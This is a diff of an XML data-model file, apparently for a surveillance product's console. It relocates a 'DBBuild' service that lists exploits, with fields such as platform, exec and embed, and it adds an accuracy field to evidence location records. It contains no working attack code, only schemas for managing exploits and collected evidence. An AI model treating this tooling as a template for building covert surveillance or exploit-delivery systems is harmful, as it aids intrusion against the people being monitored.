@@ -3526,83 +3526,6 @@
     <property name="group_name" type="string" required="true"/>
     <property name="user_name" type="string" required="true"/>
   </entity>
-  <service name="DBBuild">
-    <annotation name="ActionScriptGeneration">
-      <item name="ServiceType">HTTPMultiService</item>
-      <item name="Package">it.ht.rcs.console.build.rest</item>
-      <item name="rootURL">https://localhost:4444</item>
-    </annotation>
-    <annotation name="ServiceTypeGroup">
-      <item name="ServiceBackendType">HTTPService</item>
-    </annotation>
-    <annotation name="ServiceConfig">
-      <item name="DEFAULT_ENTITY_PACKAGE">it.ht.rcs.console.build.model</item>
-      <item name="LINKED_FILE"></item>
-    </annotation>
-    <function name="exploit_all_" return-type="Exploit[]">
-      <annotation name="analyze group">
-        <item name="analyzed">true</item>
-      </annotation>
-      <annotation name="ActionScriptGeneration">
-        <item name="SerializationFilter">com.adobe.serializers.json.JSONSerializationFilter</item>
-        <item name="method">GET</item>
-        <item name="url">/exploit</item>
-      </annotation>
-      <annotation name="url group">
-        <item name="completeURL">https://localhost:4444/exploit</item>
-      </annotation>
-      <annotation name="ValidProperties">
-        <item name="propertySpecifier">id,platform,category,description,name,exec,params,format,embed,version</item>
-      </annotation>
-      <annotation name="original signature">
-        <item name="returnType">opaque</item>
-      </annotation>
-    </function>
-  </service>
-  <entity name="Exploit">
-    <annotation name="EntityProperties">
-      <item name="EntityOriginalName">Exploit</item>
-    </annotation>
-    <annotation name="service Group">
-      <item name="service">DBBuild</item>
-    </annotation>
-    <annotation name="ServerProperties">
-      <item name="IncludeRemoteClass">nonempty</item>
-    </annotation>
-    <annotation name="exploit_all_">
-      <item name="propertySpecifier">id,platform,category,description,name,exec,params,format,embed,version</item>
-    </annotation>
-    <annotation name="ActionScriptGeneration">
-      <item name="Package">it.ht.rcs.console.build.model</item>
-    </annotation>
-    <property name="id" type="string" required="true"/>
-    <property name="platform" type="string" required="true"/>
-    <property name="category" type="string" required="true"/>
-    <property name="description" type="string" required="true"/>
-    <property name="name" type="string" required="true"/>
-    <property name="exec" type="string" required="true"/>
-    <property name="params" type="ExploitParam" required="true"/>
-    <property name="format" type="string[]" required="true"/>
-    <property name="embed" type="boolean" required="true"/>
-    <property name="version" type="integer" required="true"/>
-  </entity>
-  <entity name="ExploitParam">
-    <annotation name="EntityProperties">
-      <item name="EntityOriginalName">Params</item>
-    </annotation>
-    <annotation name="service Group">
-      <item name="service">DBBuild</item>
-    </annotation>
-    <annotation name="ServerProperties">
-      <item name="IncludeRemoteClass">nonempty</item>
-    </annotation>
-    <annotation name="ActionScriptGeneration">
-      <item name="Package">it.ht.rcs.console.build.model</item>
-    </annotation>
-    <property name="string" type="string" required="true"/>
-    <property name="file" type="string" required="true"/>
-    <property name="combo" type="string[]" required="true"/>
-  </entity>
   <service name="DBEvidence">
     <annotation name="ActionScriptGeneration">
       <item name="ServiceType">HTTPMultiService</item>
@@ -3951,6 +3874,7 @@
     <property name="keywords" type="string"/>
     <property name="latitude" type="double"/>
     <property name="longitude" type="double"/>
+    <property name="accuracy" type="integer"/>
     <property name="address" type="EvidenceDataAddress"/>
     <property name="path" type="string" required="true"/>
     <property name="attr" type="integer" required="true"/>
@@ -3974,5 +3898,82 @@
     </annotation>
     <property name="count" type="double" required="true" default="0"/>
     <property name="type" type="string" required="true"/>
+  </entity>
+  <service name="DBBuild">
+    <annotation name="ActionScriptGeneration">
+      <item name="ServiceType">HTTPMultiService</item>
+      <item name="Package">it.ht.rcs.console.build.rest</item>
+      <item name="rootURL">https://localhost:4444</item>
+    </annotation>
+    <annotation name="ServiceTypeGroup">
+      <item name="ServiceBackendType">HTTPService</item>
+    </annotation>
+    <annotation name="ServiceConfig">
+      <item name="DEFAULT_ENTITY_PACKAGE">it.ht.rcs.console.build.model</item>
+      <item name="LINKED_FILE"></item>
+    </annotation>
+    <function name="exploit_all_" return-type="Exploit[]">
+      <annotation name="analyze group">
+        <item name="analyzed">true</item>
+      </annotation>
+      <annotation name="ActionScriptGeneration">
+        <item name="SerializationFilter">com.adobe.serializers.json.JSONSerializationFilter</item>
+        <item name="method">GET</item>
+        <item name="url">/exploit</item>
+      </annotation>
+      <annotation name="url group">
+        <item name="completeURL">https://localhost:4444/exploit</item>
+      </annotation>
+      <annotation name="ValidProperties">
+        <item name="propertySpecifier">id,platform,category,description,name,exec,params,format,embed,version</item>
+      </annotation>
+      <annotation name="original signature">
+        <item name="returnType">opaque</item>
+      </annotation>
+    </function>
+  </service>
+  <entity name="Exploit">
+    <annotation name="EntityProperties">
+      <item name="EntityOriginalName">Exploit</item>
+    </annotation>
+    <annotation name="service Group">
+      <item name="service">DBBuild</item>
+    </annotation>
+    <annotation name="ServerProperties">
+      <item name="IncludeRemoteClass">nonempty</item>
+    </annotation>
+    <annotation name="exploit_all_">
+      <item name="propertySpecifier">id,platform,category,description,name,exec,params,format,embed,version</item>
+    </annotation>
+    <annotation name="ActionScriptGeneration">
+      <item name="Package">it.ht.rcs.console.build.model</item>
+    </annotation>
+    <property name="id" type="string" required="true"/>
+    <property name="platform" type="string" required="true"/>
+    <property name="category" type="string" required="true"/>
+    <property name="description" type="string" required="true"/>
+    <property name="name" type="string" required="true"/>
+    <property name="exec" type="string" required="true"/>
+    <property name="params" type="ExploitParam" required="true"/>
+    <property name="format" type="string[]" required="true"/>
+    <property name="embed" type="boolean" required="true"/>
+    <property name="version" type="integer" required="true"/>
+  </entity>
+  <entity name="ExploitParam">
+    <annotation name="EntityProperties">
+      <item name="EntityOriginalName">Params</item>
+    </annotation>
+    <annotation name="service Group">
+      <item name="service">DBBuild</item>
+    </annotation>
+    <annotation name="ServerProperties">
+      <item name="IncludeRemoteClass">nonempty</item>
+    </annotation>
+    <annotation name="ActionScriptGeneration">
+      <item name="Package">it.ht.rcs.console.build.model</item>
+    </annotation>
+    <property name="string" type="string" required="true"/>
+    <property name="file" type="string" required="true"/>
+    <property name="combo" type="string[]" required="true"/>
   </entity>
 </model>
